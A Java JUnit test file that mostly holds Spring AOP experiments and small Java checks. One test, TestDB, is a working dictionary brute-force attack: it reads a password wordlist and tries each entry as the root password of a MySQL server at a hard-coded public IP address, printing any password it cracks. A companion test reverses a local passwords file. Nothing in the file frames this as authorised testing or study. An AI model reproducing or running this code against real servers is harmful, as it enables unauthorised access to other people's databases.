import aop.AspectBiz;
import aop.Fit;
import aop.api.BizLogic;
import aop.api.BizLogicImpl;
import org.junit.Before;
import org.junit.Test;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.io.*;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.text.Format;
import java.util.ArrayList;
import java.util.List;

/**
 *  Created by ly on 2018/1/20.
 */
public class TestCls {

    ApplicationContext context;

    //@Before
    public void before(){
        context = new ClassPathXmlApplicationContext("classpath:application-annotation.xml","classpath:application-aop-schema.xml");
    }

    @Test
    public void Test(){
        AspectBiz aspectBiz = (AspectBiz) context.getBean("aspectBiz");

        aspectBiz.init("service",3);
    }

    @Test
    public void Test11(){
        int i = 0;

        i = i++;

        System.out.println(i);
    }

    @Test
    public void TestFit(){
        Fit fit = (Fit) context.getBean("aspectBiz");
        fit.fiter();

    }

    @Test
    public void TestAopApi(){
        context = new ClassPathXmlApplicationContext("classpath:application-aop-api.xml");

        BizLogic bizLogic = (BizLogic) context.getBean("bizLogicImpl");

        bizLogic.save();

    }


    @Test
    public void TestAopAscpectij(){
        context = new ClassPathXmlApplicationContext("classpath:application-aop-aspectij.xml");

        BizLogic bizLogic = (BizLogic) context.getBean("bizLogicImpl");

        bizLogic.save();

    }


    @Test
    public void Test111(){
        System.getProperties().list(System.out);
        System.out.println("============================================");
        System.out.println(System.getProperty("user.name"));
        System.out.println("============================================");
        System.out.println(System.getProperty("java.library.path"));
    }


    @Test
    public void TestChangeFile() throws IOException {
        //目标文件
        File file = new File("E:\\ChromeDownload\\passwords\\passwords.txt");
        //处理过后的文件
        File file1 = new File("C:\\Users\\Administrator\\Desktop\\test.txt");

        //字符输入流
        BufferedReader bufferedReader;
        //字符输出流
        BufferedWriter bufferedWriter;

        bufferedReader = new BufferedReader(new FileReader(file));
        bufferedWriter = new BufferedWriter(new FileWriter(file1));

        List<String> list = new ArrayList<>();


        String tempString;
        while ((tempString = bufferedReader.readLine()) != null){

            list.add(tempString + "\n");

        }

        for (int i = list.size()-1; i>=0;i--){
            bufferedWriter.write(list.get(i));
        }

        bufferedWriter.flush();

        bufferedWriter.close();
        bufferedReader.close();



    }


    @Test
    public void TestDB(){
        //目标文件
        File file = new File("E:\\ChromeDownload\\萧萧常用字典密码集合\\chinese.txt");

        //字符输入流
        BufferedReader bufferedReader;

        List<String> list = new ArrayList<>();
        try {
            bufferedReader = new BufferedReader(new FileReader(file));
            String tempString;
            while ((tempString = bufferedReader.readLine()) != null){

                list.add(tempString + "\n");

            }

        } catch (IOException e) {
            e.printStackTrace();
        }

        System.out.println(list);


        String url = "jdbc:mysql://115.28.130.216:3306/mysql";
        String name = "com.mysql.jdbc.Driver";
        String user = "root";


        Connection conn;


        try {
            Class.forName(name);//指定连接类型

            for(String password : list){
                conn = DriverManager.getConnection(url, user, password);//获取连接
                if(conn != null){
                    System.out.println("密码已破解:" + password);
                    break;
                }
            }

        } catch (ClassNotFoundException | SQLException e) {
            e.printStackTrace();
        }

    }


    public class cls extends Thread{


    }



}
